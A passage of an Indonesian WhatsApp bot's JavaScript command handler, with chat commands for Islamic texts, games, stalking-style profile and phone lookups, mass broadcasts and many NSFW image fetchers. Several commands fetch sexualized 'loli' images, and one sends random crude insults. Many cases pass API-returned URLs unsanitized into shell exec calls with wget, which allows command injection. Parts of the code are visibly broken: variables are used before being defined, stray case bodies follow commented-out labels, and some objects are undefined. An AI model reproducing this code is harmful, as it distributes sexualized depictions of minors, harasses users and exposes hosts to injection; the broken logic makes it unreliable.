				for (let i of anu.result.data) {
				teks += `Title : ${i.title}\nArab : ${i.arabic}\nTerjemah : ${i.translation}\n=================\n`
				}
				reply(teks.trim())
				break
		case 'kitab': // Like My Video
				reply(`[❕] Loading`)
				if (args.length < 1) return reply('contoh : #kitab Bukhori|35')
				anu = await fetchJson(`https://lindow-api.herokuapp.com/api/hadits?kitab=${no}&nomor=${no1}&apikey=LindowApi`)
				ct = args.join (' ')
				no = ct.split("|")[0];
				no1 = ct.split("|")[1];
				teks = `➸ Name : ${anu.result.data.name}\n➸ No : ${anu.result.number}\n➸ Arab : ${anu.result.arab}\n➸ Artinya : ${anu.result.id}`
				aldi.sendMessage(from, teks, text, {quoted: ftoko, caption: 'Nih hasilnya kak...'})
				break
				case 'googlesearch': // Follow My Github	
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply(aml.wrongf)
				ct = body.slice(14)
				ll1 = ct.split("|")[0];
                ll2 = ct.split("|")[1];
				ll3 = ct.split("|")[2];
				reply (aml.wait)
				anu = await fetchJson(`https://onlydevcity.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${onlydev}`)
				anu = await getBuffer(anu.result.url)
				aldi.sendMessage(from, anu, image, {quoted: ftoko, caption: 'Nih hasilnya kak...'})
				await limitAdd(sender)
				break
				case 'qrgopay':
				reply('WaitKak')
				wew = fs.readFileSync(`./aldiganz/R.jpg`)
            eme = `
〘 SCAN QR NYA KAK 〙`
              aldi.sendMessage(from, wew, image, {quoted: fkatalok, caption: eme})
              break
				case 'bom':
		  const hasilburuannnn = hasilburuan[Math.floor(Math.random() *   hasilburuan.length)]
		             if (args.length < 1) return reply(` CONTOH\n${prefix + command} hmm`)
                    ini = body.slice(4)
                    setTimeout( () => {
                    reply(`[ PERINTAH DILAKSANAKAN ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ ${command +  ini} ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ SEDANG BERBURU ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ SUKSES !! DAN ANDA MENDAPATKAN ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ WOW ANDA MENDAPATKAN ]\n[ ${hasilburuannnn} ]`)
                    }, 20000)
                    break
                case 'pedang':
		             const hasilburuannn = hasilburuan[Math.floor(Math.random() *   hasilburuan.length)]
		             if (args.length < 1) return reply(` CONTOH\n${prefix + command} hmm`)
                    ini = body.slice(7)
                    setTimeout( () => {
                    reply(`[ PERINTAH DILAKSANAKAN ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ ${command +  ini} ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ SEDANG BERBURU ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ SUKSES !! DAN ANDA MENDAPATKAN ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ WOW ANDA MENDAPATKAN ]\n[ ${hasilburuannn} ]`)
                    }, 20000)
                    break
           case 'tombak':
		           const hasilburuannnnn = hasilburuan[Math.floor(Math.random() *   hasilburuan.length)]
		            if (args.length < 1) return reply(` CONTOH\n${prefix + command} hmm`)
                    ini = body.slice(7)
                    setTimeout( () => {
                    reply(`[ PERINTAH DILAKSANAKAN ]`)
                    }, 1000)
                    setTimeout( () => {
                    reply(`[ ${command +  ini} ]`)
                    }, 5000)
                    setTimeout( () => {
                    reply(`[ SEDANG BERBURU ]`)
                    }, 8000)
                    setTimeout( () => {
                    reply(`[ SUKSES !! DAN ANDA MENDAPATKAN ]`)
                    }, 18000)
                    setTimeout( () => {
                    reply(`[ WOW ANDA MENDAPATKAN ]\n[ ${hasilburuannnnn} ]`)
                    }, 20000)
                    break
				   case 'memburu':
				   memburu =`Peralatan Yang Di Gunakan Untuk Memburu\n\n1. ${prefix}panah\n2. ${prefix}pedang\n3. ${prefix}bom\n4. ${prefix}tombak\n\nCARA MENGGUNAKANNYA KETIK ${prefix}panah`
				  aldi.sendMessage(from, memburu, text, {quoted: fkontak})
				          break
					case 'cml':
					case 'ml':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					if (args.length < 1) return reply('Teksnya mana gan??')
                     			if (args.length > 10) return reply('karakter minimal 10')
					cml = `${body.slice(5)}`
					cml1 = cml.split("/")[0];
					cml2 = cml.split("/")[1];
					kontol = await getBuffer(`https://api.vhtear.com/logoml?hero=${cml1}&text=${cml2}&apikey=${apivhtear}`, {method: 'get'})
					aldi.sendMessage(from, kontol, image, {quoted: fkontak})
					await limitAdd(sender) 
					break  
case 'harta':
case 'tahta':
case 'hartatahta':
if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
if (isLimit(sender)) return reply(aml.limitend)
if (args.length < 1) return reply(`「❗」Contoh : ${prefix}hartatahta botwea`)
har = args.join('  ')
hoo = await getBuffer(`http://lolhuman.herokuapp.com/api/hartatahta?apikey=${lolhuman}&text=${har}` )
reply('「❗」Hirti Tihti Tai Anjg :v')
aldi.sendMessage(from, hoo, image, {quoted: fkontak})
await limitAdd(sender)
break

case 'antilinkgrup':
					if (!isGroup) return reply(aml.groupo)
					if (!isGroupAdmins) return reply(aml.admin)
					if (!isBotGroupAdmins) return reply(aml.badmin)					
					if (args.length < 1) return reply('Pilih enable atau disable udin!')
					if (args[0] === 'enable') {
						if (isAntiLink) return reply('anti link group sudah aktif')
						antilink.push(from)
						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
						reply('Sukses mengaktifkan anti link group di group ini ✔️')
						aldi.sendMessage(from,`Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group`, text)
	           } else if (args[0] === 'disable') {
						if (!isAntiLink) return reply('Mode anti link group sudah disable')
						antilink.splice(from)
						fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
						reply('SUKSES MEMATIKAN ANTI LINK DI GROUP INI')
					} else {
						reply('enable untuk mengaktifkan, diseble untuk menonaktifkan')
					}
					break
					
                case 'quotes':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/quotesnime/random`, {method: 'get'})
					reply(anu.quotes)
					await limitAdd(sender)
					break		
					case 'infonomor':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
                    if (args.length < 1) return reply(`Masukan Nomor\nContoh : ${prefix}infonomor 0812345678`)
                data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${body.slice(11)}`)
                if (data.error) return reply(data.error)
                if (data.result) return reply(data.result)
                hasil = `╠➥ internasional : ${data.international}\n╠➥ nomor : ${data.nomor}\n╠➥ operator : ${data.op}`
                reply(hasil)
                await limitAdd(sender)
					break 
                case 'marah':
                    kapankah = body.slice(1)
                    if (isLimit(sender)) return reply(aml.limitend)
					const slap =['anjing','babi lu','anak anjing','udah tolol nub Lagi','muka lo kek monyet','udah jomblo sendirian lagi dirumah tolol','so so an mau punya pacar muka aja kek monyet lepass dari kandang','ganteng doang di toxic aja dibilang baperan','pantek kau','bangsat kau','ku entod kalian nangis kau','memek lu semua','lihat anak anjing lagi baca','ngentot lu ya?','ganteng doang jemput cewe dipanggang','kamu cantik beb bullshit anjing cowo buaya','anak dajjal','puki lu','anjing ngajak gelud?','sama hantu takut cupu ngentod','cupu cupu aja gausah bacot','kontol lu semua','bocah lu semua kontol','3 Hari Lagi','Ngontol Amat']
					const ple = slap[Math.floor(Math.random() *   slap.length)]
					pod = await getBuffer(`https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif`)
					aldi.sendMessage(from, pod, image, { quoted: fkontak, caption: 'Toxic\n\n'+ ple })
					await limitAdd(sender)
					break
					case 'tampar':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					kontol = await getBuffer('https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif', {method: 'get'})
					exec(`wget ${kontol.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(ind.stikga())
						kontol = fs.readFileSync(rano)
						aldi.sendMessage(from, kontol, sticker, {quoted: fkontak})
						fs.unlinkSync(rano)
					})
					await limitAdd(sender)
					break
                case 'beritahoax':
                     if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                     if (isLimit(sender)) return reply(aml.limitend)
                    aldi.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infohoax`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `Gambar : ${i.image}\nTitle : ${i.title}\nlink : ${i.link}\ntag : ${i.tag}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break 
					case 'setbotpp':
					if (!isOwner) return reply(aml.ownerb)
				    aldi.updatePresence(from, Presence.composing) 
					if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await aldi.downloadAndSaveMediaMessage(enmedia)
					await aldi.updateProfilePicture(botNumber, media)
					reply('Makasih profil barunya,Wangy sekali😗')
					break 
					case 'brainly':
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
                    brien = body.slice(9)
					brainly(`${brien}`).then(res => {
					teks = '❉───────────❉\n'
					for (let Y of res.data) {
						teks += `\n「 _BRAINLY_ 」\n\n➸ Pertanyaan: ${Y.pertanyaan}\n\n➸ Jawaban: ${Y.jawaban[0].text}\n❉───────────❉\n`
					}
					aldi.sendMessage(from, teks, text, {quoted: ftoko, detectLinks: false})
                        console.log(res)
                    })
					await limitAdd(sender)
					break 
				case 'bcgc':
				        if (!isOwner) return reply(aml.ownerb)
					    if (args.length < 1) return reply('.......')
					    anu = await groupMembers
					    nom = mek.participant
					    if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						kontol = await aldi.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							aldi.sendMessage(_.jid, kontol, image, {caption: `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`})
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`)
						}
						reply('Sukses broadcast group')
					}
					break
                case 'sewa':
				case 'sewabot':
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					aldi.sendMessage(from, sewabot(prefix) , text)
					break  
				case 'husbu':
				   if (!isRegistered) return reply(aml.noregis)
		           if (isBanned) return reply(aml.baned)
				   if (isLimit(sender)) return reply(aml.limitend)
			   	if (!isGroup) return reply(ind.group())
					aldi.sendMessage(from, Presence.composing) 
				    data = await fetchJson(`https://api.fdci.se/rep.php?gambar=husbu`, {method: 'get'})
				    reply (aml.wait)
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() *   n.length)];
				    pok = await getBuffer(nimek)
				    aldi.sendMessage(from, pok, image, { quoted: fkontak})
					break
				case 'nekonime':
				if (!isRegistered) return reply(aml.noregis)
		         if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					gatauda = args.join('  ')
					anu = await fetchJson(`https://api.vhtear.com/randomnekonime&apikey=${apivhtear}`, {method: 'get'})
					reply (aml.wait)
					kontol = await getBuffer(anu.result.result)
					aldi.sendMessage(from, kontol, image, { caption: 'Save loli, Pukul furry', quoted: fkontak})
					await limitAdd(sender)
					break
///MATA BOKEP YAAA KONTOLLLLL////
               case 'ranime':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (!isNsfw) return reply(aml.nsfwoff)
					gatauda = body.slice(8)
					reply (aml.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomanime?apikey=${TobzKey}`, {method: 'get'})
					kontol = await getBuffer(anu.result)
					aldi.sendMessage(from, kontol, image, {quoted: fkontak})
					await limitAdd(sender)
					break
               
				case 'nsfwloli':
				try {   
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
				if (!isNsfw) return reply(aml.nsfwoff)
				if (!isGroup) return reply(aml.groupo) 
				res = await fetchJson(`https://api.vhtear.com/randomloli&apikey=${apivhtear}`, {method: 'get'})
					reply (aml.wait)
					kontol = await getBuffer(res.result.result)
					aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: 'Jangan jadiin bahan buat comli om'})
				} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(' ERROR ')
				}
					await limitAdd(sender)
					break 
				case 'coba':
				    try {
                        if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (!isNsfw) return reply(aml.nsfwoff)
						axios.get(`https://nekos.life/api/v2/img/wallpaper`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "INGAT ADA TUHAN KAK"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('ERROR')
					}
					break
			case 'nsfwpussy':
				    try {
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (!isNsfw) return reply(aml.nsfwoff)
						axios.get(`https://nekos.life/api/v2/img/pussy_jpg`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "INGAT ADA TUHAN KAK"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('ERROR')
					}
					break
			case 'nsfwyuri':
				    try {
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (!isNsfw) return reply(aml.nsfwoff)
						axios.get(`https://nekos.life/api/v2/img/yuri`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = kontol.from(response, 'base64');
					aldi.sendMessage(from, buf, image, {quoted: ftoko,caption: "INGAT ADA TUHAN KAK"})
					})})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('ERROR')
					}
					break
			case 'nsfwtrap':
				    try {
					    if (!isRegistered) return reply(aml.noregis)
		                if (isBanned) return reply(aml.baned)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (!isNsfw) return reply(aml.nsfwoff)
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap?apikey=${lolhuman}`, {method: 'get'})
						kontol = await getBuffer(res.result)
						aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: 'INGAT ADA TUHAN KAK'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('ERROR')
					}
					break
			case 'nsfwloli2':
				    try {
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (!isNsfw) return reply(aml.nsfwoff)
						res = await fetchJson(`https://api.lolis.life/random?nsfw=true`, {method: 'get'})
						kontol = await getBuffer(res.url)
						aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: 'INGAT ADA TUHAN KAK'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('ERROR')
					}
					break
			case 'nsfwwaifu':
                    if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
                   if (!isGroup) return reply(aml.groupo)
                   if (!isNsfw) return reply(aml.nsfwoff)
                    kontol = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${lolhuman}`)
                    aldi.sendMessage(from, kontol, image, { quoted: fkontak, caption: 'Nih Bro'  })
                    break
			case 'waifu2':
				    try {
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                        if (isLimit(sender)) return reply(aml.limitend)
                        if (!isNsfw) return reply(aml.nsfwoff)
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/waifu?apikey=${lolhuman}`, {method: 'get'})
						kontol = await getBuffer(res.result)
						aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: ':)'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ ERROR ❌')
					}
					break
				case 'nsfwneko':
				try {  
				if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (isLimit(sender)) return reply(aml.limitend)
			        if (!isNsfw) return reply(aml.nsfwoff)
		            if (!isGroup) return reply(aml.groupo) 
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko?apikey=${TobzKey}`, {method: 'get'})
						kontol = await getBuffer(res.result)
						aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: 'ni anjim'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(' ERROR ')
					}
					await limitAdd(sender) 
					break 
				case 'wibu2':
				if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (isLimit(sender)) return reply(aml.limitend)
			        if (!isNsfw) return reply(aml.nsfwoff)
		            if (!isGroup) return reply(aml.groupo) 
					data = await fetchJson(`https://api.vhtear.com/randomwibu&apikey=${apivhtear}`)
					reply (aml.wait)
					kontol = await getBuffer(data.result.foto)
					aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: '^W^'})
					await limitAdd(sender)
					break
			case 'nekopoi':
			        if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
			        if (isLimit(sender)) return reply(aml.limitend)
			        if (!isNsfw) return reply(aml.nsfwoff)
		            if (!isGroup) return reply(aml.groupo) 
                    if (args.length < 1) return reply('teksnya mana gan?')
                    teks = body.slice(9)
                    anu = await fetchJson(`https://api.vhtear.com/nekosearch?query=${teks}&apikey=${apivhtear}`, {method: 'get'})
			reply (aml.wait)
                    teks = `===============\n`
                    for (let neko of anu.result) {
                    teks += `Title: ${neko.title}\nDeskripsi: ${neko.detail}\n===============\n`
                    }
                    reply(teks.trim())
			     	await limitAdd(sender) 
			     	break  
        case 'hentai':
			        if (!isNsfw) return reply(aml.nsfwoff)
				    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
					if (!isNsfw) return reply(' FALSE ')
				    ini_kontol = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolhuman}`)
                    aldi.sendMessage(from, ini_kontol, image, { quoted: fkontak })
                    break
               case 'hentai4everyone':
				case 'animebellybutton':
				case 'biganimetiddies':
				case 'lewdanimegirls':
				case 'hentaifemdom':
				case 'animearmpits':
				case 'hentaiparadise':
				case 'animethighss':
				case 'animebooty':
				case 'animefeets':
				case 'sideoppai':
				case 'hololewd':
				case 'ahegao':
				case 'ecchi':
				case 'yaoi':
				case 'trap':
				case 'chiisaihentai':
				case 'loli':
				case 'waifu ':
				case 'neko':
                //[â—] case by DappaGanz
               try {
				if (!isNsfw) return reply('Nsfw belom di aktifkan di grup sini')
				if (!isRegistered) return reply(aml.noregis)
		        if (isBanned) return reply(aml.baned)
            	if (isLimit(sender)) return reply(aml.limitend)
				reply(aml.wait) 
				dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolhuman}`)
				aldi.sendMessage(from, dapuhy, image, {quoted: fkontak})
				} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(' ERROR ')
				}
				await limitAdd(sender)
				break
                case 'eroyuri':			
                    if (!isGroup) return reply(aml.groupo)	
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					Buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/random/nsfw/eroyuri?apikey=${lolhuman}`, {method: 'get'})
					aldi.sendMessage(from, Buffer, image, {quoted: ftoko })
					await limitAdd(sender) 
					break
				case 'hentai2':
                //[â—] case by DappaGanz
				if (!isNsfw) return reply(aml.nsfwoff)
			   if (!isRegistered) return reply(aml.noregis)
		       if (isBanned) return reply(aml.baned)
               if (isLimit(sender)) return reply(aml.limitend)
				reply(aml.wait) 
				dapuhy = await getBufferer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${lolhuman}`)
				dp.sendMessage(from, dapuhy, image, {quoted: fkontak})
				await limitAdd(sender)
				break
				//case 'feetg':
				//case 'solog':
			//case 'kuni':
				//case 'anal':
				//case 'cum':
				//case 'bj':
				//case 'classic':
				//case 'erokemo':
				//case 'cuddle':
				//case 'pussy':
				//case 'random_hentai_gif':
				//case 'nsfw_neko_gif':
                //[â—] case by DappaGanz
               if (!isNsfw) return reply(aml.nsfwoff)
			   if (!isRegistered) return reply(aml.noregis)
		       if (isBanned) return reply(aml.baned)
               if (isLimit(sender)) return reply(aml.limitend)
				reply(aml.wait) 
                ranp = getRandom('.gif')
                rano = getRandom('.webp')
				dapuhyy = `https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolhuman}`
				exec(`wget ${dapuhyy} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                fs.unlinkSync(ranp)
                ambil = fs.readFileSync(rano)
                dp.sendMessage(from, ambil, sticker, {quoted: fkontak})
                fs.unlinkSync(rano)
                })
                await limitAdd(sender)
                break
				case 'blowjobgif':
                //[â—] case by DappaGanz
                if (!isNsfw) return reply(dpa.nsfwoff)
				if (!isUser) return reply(dpa.noregis)
				if (isBanned) return reply(dpa.baned)
				if (isLimit(sender)) return reply(dpa.limitend)
				reply(aml.wait) 
                ranp = getRandom('.gif')
                rano = getRandom('.webp')
                dapuhyy = `https://api.lolhuman.xyz/api/random/nsfw/blowjob?apikey=${lolhuman}`
                exec(`wget ${dapuhyy} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                fs.unlinkSync(ranp)
                ambil = fs.readFileSync(rano)
                dp.sendMessage(from, ambil, sticker, {quoted: fkontak})
                fs.unlinkSync(rano)
                }) 
                await limitAdd(sender)
                break
				case 'neko':
				    if (!isNsfw) return reply(aml.nsfwoff)
                    if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
                	if (isLimit(sender)) return reply(aml.limitend)
					res = await fetchJson(`https://tobz-api.herokuapp.com/api/nekonime?apikey=${TobzKey}`, {method: 'get'})
					reply (aml.wait)
					kontol = await getBuffer(res.result)
					aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: 'Nih nekonime mu >_<'})
					await limitAdd(sender)
					break
/////DH KELAR KONTOLLL////
					case 'tebakgambar':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					anu = await fetchJson(`https://api-aldifvnky.herokuapp.com/api/kuis/tebakgambar?apikey=Alphabot`, {method: 'get'})
					ngekontol = await getBuffer(anu.result.images)
					tebak = `➸ Jawaban : ${anu.result.jawaban}\n\nAuthor : ${anu.result.author}`
					setTimeout( () => {
					aldi.sendMessage(from, tebak, text, {quoted: fkontak})
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					aldi.sendMessage(from, ngekontol, image, { caption: '_Tebak bro!!! gak bisa jawab donasi ya:v_', quoted: fkontak }) // ur cods
					}, 0) // 1000 = 1s,
					await limitAdd(sender) 
					break
                    case 'wikipedia':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Tahu`)
                    query = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/wiki?apikey=${lolhuman}&query=${query}`)
                    get_result = get_result.result
                    reply(get_result)
                    break
                    case 'translate':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} en Tahu Bacem`)
                    kode_negara = args[0]
                    args.shift()
                    ini_txt = args.join('  ')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${lolhuman}&text=${ini_txt}`)
                    get_result = get_result.result
                    init_txt = `From : ${get_result.from}\n`
                    init_txt += `To : ${get_result.to}\n`
                    init_txt += `Original : ${get_result.original}\n`
                    init_txt += `Translated : ${get_result.translated}\n`
                    init_txt += `Pronunciation : ${get_result.pronunciation}\n`
                    reply(init_txt)
                    break
				case 'randomhentong':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
			if (!isNsfw) return reply(aml.nsfwoff)
					gatauda = body.slice(15)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai?apikey=${TobzKey}`)
					reply (aml.wait)
					kontol = await getBuffer(anu.result)
					aldi.sendMessage(from, kontol, image, { caption: 'Comli teross', quoted: fkontak})
					await limitAdd(sender)
					break			
			case 'blowjob':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
			if (!isNsfw) return reply(aml.nsfwoff)
				ranp = getRandom('.gif')
				rano = getRandom('.webp')
				anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob?apikey=${TobzKey}`, {method: 'get'})
				if (anu.error) return reply(anu.error)
				exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
				fs.unlinkSync(ranp)
				if (err) return reply(ind.stikga())
				kontol = fs.readFileSync(rano)
				aldi.sendMessage(from, kontol, sticker, {quoted: fkontak})
				fs.unlinkSync(rano)
				
				})
				break
			case 'nangis':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzKey}`, {method: 'get'})
					reply('「❗」KASIH JEDA 1 MENIT HABIS INI YA KAK')
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
					fs.unlinkSync(ranp)
					if (err) return reply(ind.stikga())
					kontol = fs.readFileSync(rano)
					aldi.sendMessage(from, kontol, sticker, {quoted: fkontak})
					fs.unlinkSync(rano)
					
					})
					break
		case 'resepmasakan':  
                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                if (isLimit(sender)) return reply(aml.limitend)
                reply (aml.wait)
                   anu = await fetchJson(`https://api.vhtear.com/resepmasakan?query=${body.slice(12)}&apikey=${apivhtear}`, {method: 'get'})
                   kontol = await getBuffer(anu.result.image)
                   resep = `${anu.result.title}\n${anu.result.desc}\n\nBAHAN² YG DIPERLUKAN\n${anu.result.bahan}\n\nCARA MASAKNYA\n${anu.result.cara}`
                   aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: resep})
                   await limitAdd(sender) 
                   break 
                   case 'stalkig':
                   if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                   if (isLimit(sender)) return reply(aml.limitend)
                     reply('[🎰] Sabar lagi stalking IG nya')
				get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalkig/${body.slice(9)}?apikey=${lolhuman}`)
				get_result = get_result.result
				txt = `Link : https://www.instagram.com/${get_result.username}\n`
				txt += `Full : ${get_result.fullname}\n`
				txt += `Post : ${get_result.posts}\n`
				txt += `Followers : ${get_result.followers}\n`
				txt += `Following : ${get_result.following}\n`
				txt += `Bio : ${get_result.bio}\n`
				kontol = await getBuffer(get_result.photo_profile)
				aldi.sendMessage(from, kontol, image, {quoted: ftoko, caption: txt})
				await limitAdd(sender)
				break
			       case 'githubstalk':
					if (!isRegistered) return reply(aml.noregis)
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/github/${body.slice(13)}?apikey=${lolhuman}`, {method: 'get'})
					get_result = get_result.result
					txt = `Full : ${get_result.name}\n`
